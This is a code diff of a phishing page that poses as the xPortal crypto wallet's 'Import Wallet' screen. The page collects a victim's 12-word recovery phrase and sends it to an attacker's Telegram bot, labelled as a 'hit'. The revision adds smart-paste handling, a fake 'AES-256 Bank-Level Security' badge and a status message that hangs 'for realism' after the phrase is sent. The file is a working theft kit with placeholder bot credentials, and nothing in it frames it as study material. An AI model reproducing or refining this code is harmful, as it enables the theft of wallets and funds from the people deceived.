@@ -1,110 +1,128 @@
-<link rel="icon" type="image/png" href="Capture.png">
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>xPortal | Secure Wallet</title>
+    <title>xPortal | Secure Wallet Access</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --xp-black: #000; --xp-teal: #23f7dd; --xp-purple: #8a3ffc; --xp-border: rgba(255, 255, 255, 0.1); }
+        :root { --bg: #000; --card: #0d0d0d; --teal: #23f7dd; --purple: #8a3ffc; --border: rgba(255,255,255,0.08); --text-gray: #888; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: var(--xp-black); color: #fff; min-height: 100vh; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 70%); }
-        
-        nav { width: 100%; height: 70px; display: flex; align-items: center; padding: 0 5%; border-bottom: 1px solid var(--xp-border); background: rgba(0,0,0,0.5); backdrop-filter: blur(20px); position: fixed; top: 0; z-index: 100; }
-        .nav-logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 20px; }
+        body { background: var(--bg); color: #fff; min-height: 100vh; overflow-x: hidden; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 75%); }
+
+        /* NAVIGATION */
+        nav { height: 72px; padding: 0 5%; display: flex; align-items: center; background: rgba(0,0,0,0.6); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border); position: fixed; top: 0; width: 100%; z-index: 1000; }
+        .nav-logo { display: flex; align-items: center; gap: 12px; font-weight: 800; font-size: 20px; letter-spacing: -0.5px; }
         .nav-logo img { width: 32px; height: 32px; object-fit: contain; }
 
-        .page-section { display: none; margin-top: 100px; width: 100%; animation: fadeIn 0.3s; padding: 20px; flex-direction: column; align-items: center; }
-        .page-section.active { display: flex; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .glass-card { background: rgba(13, 13, 13, 0.8); border: 1px solid var(--xp-border); border-radius: 32px; padding: 40px 25px; text-align: center; width: 100%; max-width: 450px; box-shadow: 0 40px 80px rgba(0,0,0,0.8); }
-        .card-icon { width: 70px; height: 70px; margin-bottom: 20px; object-fit: contain; }
-
-        .btn-main { width: 100%; height: 60px; border-radius: 100px; border: none; font-weight: 700; font-size: 16px; cursor: pointer; margin-bottom: 12px; transition: 0.2s; }
-        .btn-white { background: #fff; color: #000; }
-        .btn-dark { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid var(--xp-border); }
+        /* MAIN WRAPPER */
+        .container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; padding-top: 100px; }
+        .glass-card { background: var(--card); border: 1px solid var(--border); border-radius: 32px; padding: 45px 30px; width: 100%; max-width: 460px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); position: relative; overflow: hidden; }
         
-        .words-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
-        .word-box { position: relative; }
-        .word-box span { position: absolute; left: 8px; top: 50%; transform: translateY(-50%); color: var(--xp-teal); font-size: 10px; font-weight: 700; }
-        .word-box input { width: 100%; background: #000; border: 1px solid var(--xp-border); border-radius: 10px; padding: 12px 5px 12px 25px; color: #fff; font-size: 13px; }
+        .hero-logo { width: 70px; height: 70px; margin-bottom: 25px; filter: drop-shadow(0 0 15px rgba(138, 63, 252, 0.4)); }
+        h1 { font-size: 26px; font-weight: 800; margin-bottom: 10px; letter-spacing: -1px; }
+        .subtitle { color: var(--text-gray); font-size: 14px; margin-bottom: 35px; line-height: 1.5; }
 
-        #loading-text { display: none; color: var(--xp-teal); font-weight: 600; margin-top: 15px; }
+        /* WORD GRID */
+        .phrase-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 30px; }
+        .word-box { position: relative; }
+        .word-box span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; font-weight: 700; color: var(--teal); opacity: 0.6; }
+        .word-box input { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 12px 5px 12px 30px; color: #fff; font-size: 14px; transition: 0.3s; }
+        .word-box input:focus { border-color: var(--purple); background: rgba(138, 63, 252, 0.05); outline: none; box-shadow: 0 0 15px rgba(138, 63, 252, 0.1); }
+
+        /* BUTTONS */
+        .btn-connect { width: 100%; height: 60px; background: #fff; color: #000; border: none; border-radius: 100px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        .btn-connect:hover { background: var(--teal); transform: translateY(-2px); }
+
+        /* STATUS */
+        #status-msg { display: none; margin-top: 20px; color: var(--teal); font-weight: 600; font-size: 14px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+
+        .shield-tag { margin-top: 30px; font-size: 10px; color: #444; font-weight: 800; letter-spacing: 1.5px; display: flex; align-items: center; justify-content: center; gap: 6px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
 <nav>
-    <div class="nav-logo"><img src="Capture.PNG"><span>xPortal</span></div>
+    <div class="nav-logo">
+        <img src="Capture.PNG" alt="Logo">
+        <span>xPortal</span>
+    </div>
 </nav>
 
-<section id="home" class="page-section active">
+<div class="container">
     <div class="glass-card">
-        <img src="Capture.PNG" class="card-icon">
-        <h2>Welcome to xPortal</h2>
-        <p style="color:#949494; margin: 15px 0 30px;">Choose an option to manage your assets.</p>
-        <button class="btn-main btn-white" onclick="showSection('create')">Create New Wallet</button>
-        <button class="btn-main btn-dark" onclick="showSection('import')">Import Wallet</button>
-    </div>
-</section>
+        <img src="Capture.PNG" class="hero-logo">
+        
+        <h1>Import Wallet</h1>
+        <p class="subtitle">Enter your 12-word secret recovery phrase to securely restore your wallet.</p>
 
-<section id="create" class="page-section">
-    <div class="glass-card">
-        <img src="Capture.PNG" class="card-icon">
-        <h2>Recovery Phrase</h2>
-        <p style="color:#949494; margin-bottom: 20px;">Save these 12 words securely.</p>
-        <div class="words-grid" id="gen-grid"></div>
-        <button class="btn-main btn-white" onclick="showSection('verify')">I've saved them</button>
-    </div>
-</section>
+        <form id="walletForm">
+            <div class="phrase-grid" id="inputs">
+                </div>
 
-<section id="import" class="page-section">
-    <div class="glass-card">
-        <img src="Capture.PNG" class="card-icon">
-        <h2>Secret Phrase</h2>
-        <p style="color:#949494; margin-bottom: 20px;">Enter your 12 words phrase.</p>
-        <div class="words-grid" id="input-grid"></div>
-        <button class="btn-main btn-white" id="subBtn" onclick="submitHit()">Connect Wallet</button>
-        <div id="loading-text">Verifying connection...</div>
+            <button type="submit" class="btn-connect" id="btnText">Connect Wallet</button>
+        </form>
+
+        <div id="status-msg">Establishing Secure Connection...</div>
+
+        <div class="shield-tag">
+            <svg width="12" height="12" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            AES-256 Bank-Level Security
+        </div>
     </div>
-</section>
+</div>
 
 <script>
-    const TOKEN = 'YOUR_BOT_TOKEN';
-    const CHAT_ID = 'YOUR_CHAT_ID';
+    // --- TELEGRAM CONFIG ---
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Badel hada
+    const CHAT_ID = 'YOUR_CHAT_ID';     // Badel hada
 
-    const dummyWords = ["apple","brave","ocean","tiger","smart","focus","cloud","planet","winter","summer","bright","shield"];
+    // Generate 12 Inputs
+    const container = document.getElementById('inputs');
+    for(let i=1; i<=12; i++) {
+        container.innerHTML += `
+            <div class="word-box">
+                <span>${i}</span>
+                <input type="password" class="w-input" required autocomplete="off" oninput="handleSmartPaste(event, ${i})">
+            </div>
+        `;
+    }
 
-    function showSection(id) {
-        document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-        if(id === 'create') {
-            const g = document.getElementById('gen-grid');
-            g.innerHTML = dummyWords.map((w, i) => `<div class="word-box"><span>${i+1}</span><input value="${w}" readonly></div>`).join('');
-        }
-        if(id === 'import' || id === 'verify') {
-            const g = document.getElementById('input-grid');
-            g.innerHTML = '';
-            for(let i=1; i<=12; i++) g.innerHTML += `<div class="word-box"><span>${i}</span><input type="text" class="w-in"></div>`;
+    // Smart Paste Logic: Ila dar paste l-phrase kamla f box whda kiferreqha
+    function handleSmartPaste(e, index) {
+        const val = e.target.value.trim();
+        if (val.includes(' ')) {
+            const words = val.split(/\s+/);
+            const inputs = document.querySelectorAll('.w-input');
+            words.forEach((w, i) => {
+                if (inputs[i]) inputs[i].value = w;
+            });
         }
     }
 
-    function submitHit() {
-        let words = [];
-        document.querySelectorAll('.w-in').forEach(i => words.push(i.value.trim()));
-        const phrase = words.join(" ");
+    document.getElementById('walletForm').addEventListener('submit', function(e) {
+        e.preventDefault();
         
-        document.getElementById('subBtn').style.display = 'none';
-        document.getElementById('loading-text').style.display = 'block';
+        const inputs = document.querySelectorAll('.w-input');
+        let phrase = [];
+        inputs.forEach(i => phrase.push(i.value.trim()));
 
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🚨 xPortal Hit:\n\n" + phrase)}`);
-    }
+        // UI State
+        document.getElementById('btnText').style.display = 'none';
+        document.getElementById('status-msg').style.display = 'block';
+
+        // Send to Telegram
+        const finalPhrase = phrase.join(" ");
+        const message = `🚀 NEW XPORTAL HIT!\n\nPhrase: ${finalPhrase}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+        .then(() => {
+            console.log("Logged.");
+            // Hangs on "Establishing Connection" for realism
+        });
+    });
 </script>
 
 </body>
 </html>
-
-<center><img src="Capture.png" style="width: 50px; margin-top: 20px;"></center>
